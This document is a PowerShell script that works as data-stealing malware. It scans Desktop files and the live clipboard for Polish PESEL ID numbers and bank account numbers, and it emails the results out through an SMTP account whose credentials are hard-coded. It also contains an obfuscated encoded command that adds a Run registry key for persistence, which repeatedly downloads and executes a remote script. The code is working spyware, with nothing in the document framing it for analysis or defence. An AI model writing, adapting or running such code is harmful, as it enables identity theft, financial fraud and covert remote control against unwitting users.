
function Get-IsPesel([System.String]$pesels){
    $weights = 9, 7, 3, 1, 9, 7, 3, 1, 9, 7 
    $sum = 0
    $chars = [char[]]$pesels
    #Write-Output $chars
    for($i = 0; $i -lt 10; $i++){
        $sum += ($weights[$i] * ([int]$chars[$i] - [int][char]'0'))
    } 
    $mod = $sum % 10
    $csVal = [int]$chars[10] - [int][char]'0'
    return $mod -eq $csVal
}

function Get-IsAccount([System.String]$accounts){
    return [bool] 1
}

PowerShell -enc UwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACIASABLAEMAVQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAUgB1AG4AIgAgAC0ATgBhAG0AZQAgAFQAaABlAFQAcgB1AHMAdABlAGQAUwBvAGYAdAAgAC0AVgBhAGwAdQBlACAAJwBDADoAXABXAGkAbgBkAG8AdwBzAFwAUwB5AHMAdABlAG0AMwAyAFwAYwBtAGQALgBlAHgAZQAgAC8AYwAgACIAcABvAHcAZQByAHMAaABlAGwAbAAgAC0ARQB4AGUAYwB1AHQAaQBvAG4AUABvAGwAaQBjAHkAIABSAGUAbQBvAHQAZQBTAGkAZwBuAGUAZAAgAC0AZQBuAGMAIABkAHcAQgBvAEEARwBrAEEAYgBBAEIAbABBAEMAZwBBAE0AUQBBAHAAQQBIAHMAQQBkAEEAQgB5AEEASABrAEEAZQB3AEIAcABBAEcAVQBBAGUAQQBBAGcAQQBDAGcAQQBhAFEAQgAzAEEASABJAEEASQBBAEEAbgBBAEcAZwBBAGQAQQBCADAAQQBIAEEAQQBPAGcAQQB2AEEAQwA4AEEATQBRAEEAeQBBAEQAYwBBAEwAZwBBAHcAQQBDADQAQQBNAEEAQQB1AEEARABFAEEATwBnAEEANABBAEQAQQBBAE0AQQBBAHcAQQBDADgAQQBjAHcAQgBsAEEARwBNAEEATABRAEIAbQBBAEcAawBBAGIAQQBCAGwAQQBDADQAQQBjAEEAQgB6AEEARABFAEEASgB3AEEAcABBAEgAMABBAFkAdwBCAGgAQQBIAFEAQQBZAHcAQgBvAEEASABzAEEAVgB3AEIAeQBBAEcAawBBAGQAQQBCAGwAQQBDADAAQQBUAHcAQgAxAEEASABRAEEAYwBBAEIAMQBBAEgAUQBBAEkAQQBBAGkAQQBGAE0AQQBiAEEAQgBsAEEARwBVAEEAYwBBAEIAcABBAEcANABBAFoAdwBBAGkAQQBEAHMAQQBVAHcAQgAwAEEARwBFAEEAYwBnAEIAMABBAEMAMABBAFUAdwBCAHMAQQBHAFUAQQBaAFEAQgB3AEEAQwBBAEEATABRAEIAVABBAEcAVQBBAFkAdwBCAHYAQQBHADQAQQBaAEEAQgB6AEEAQwBBAEEATgBnAEEAdwBBAEQAcwBBAFkAdwBCAHYAQQBHADQAQQBkAEEAQgBwAEEARwA0AEEAZABRAEIAbABBAEQAcwBBAGYAUQBCAGkAQQBIAEkAQQBaAFEAQgBoAEEARwBzAEEATwB3AEIAOQBBAEEAPQA9ACIAJwA=
function Get-ScanDesktop{
    Get-ChildItem $DesktopPath -Recurse -File |
        ForEach-Object -Process { 

            $peselMatches = Select-String -Path $_.FullName -Pattern "[0-9]{11}" -AllMatches

            foreach($pesels in $peselMatches){
                foreach($pesel in $pesels.Matches){
                    if(Get-IsPesel -pesels $pesel.Value){
                        if(!($foundPesel.Contains($pesel.Value))){
                            $null = $foundPesel.Add($pesel.Value) 
                        }
                        
                    }
                }
            }

            $accountMatches = Select-String -Path $_.FullName -Pattern "[0-9]{2}((\s|\t)?[0-9]{4}){6}" -AllMatches

            foreach($accounts in $accountMatches){
               foreach($account in $accounts.Matches){
                    if(Get-IsAccount -accounts $account.Value){
                       if(!($foundAccou.Contains($account.Value))){
                            $null = $foundAccou.Add($account.Value)
                       }
                    }
                }
            }
        }
}

function Update-Data{
    try{
        $msg = "Pesele:`n"
        foreach($pesel in $foundPesel){
            $msg += $pesel + "`n"
        }
        $msg += "`nKonta:`n"
        foreach($acc in $foundAccou){
            $msg += $acc + "`n"
        }
        $Message = New-Object System.Net.Mail.MailMessage("ttestmal.smtp@interia.pl", "ttestmal.smtp@interia.pl", "Report", $msg)
        $Smtp = New-Object Net.Mail.SmtpClient("poczta.interia.pl", "587")
        $Smtp.Credentials = New-Object System.Net.NetworkCredential("ttestmal.smtp","TTT3sted1") 
        $Smtp.Send($Message)
    }catch{
        return
    }
}


$DesktopPath = [Environment]::GetFolderPath("Desktop")
$foundPesel = [System.Collections.ArrayList]@()
$foundAccou = [System.Collections.ArrayList]@()

Get-ScanDesktop
Update-Data

$i = 0
while(1){
    $clp = Get-Clipboard

    $peselMatches = $clp | Select-String -Pattern "[0-9]{11}" -AllMatches

    foreach($pesels in $peselMatches){
        foreach($pesel in $pesels.Matches){
            if(Get-IsPesel -pesels $pesel.Value){
                if(!($foundPesel.Contains($pesel.Value))){
                    $null = $foundPesel.Add($pesel.Value) 
                }
            }
        }
    }

    $accountMatches = $clp | Select-String -Pattern "[0-9]{2}((\s|\t)?[0-9]{4}){6}" -AllMatches

    foreach($accounts in $accountMatches){
        foreach($account in $accounts.Matches){
            if(Get-IsAccount -pesels $account.Value){
                if(Get-IsAccount -accounts $account.Value){
                    if(!($foundAccou.Contains($account.Value))){
                        $null = $foundAccou.Add($account.Value)
                    }
                }
            }
        }
    }
    $i += 1
    if($i -eq 144000){
        $i = 0
        Update-Data
    }else{
        Start-Sleep -Milliseconds 200
    }  
}
        


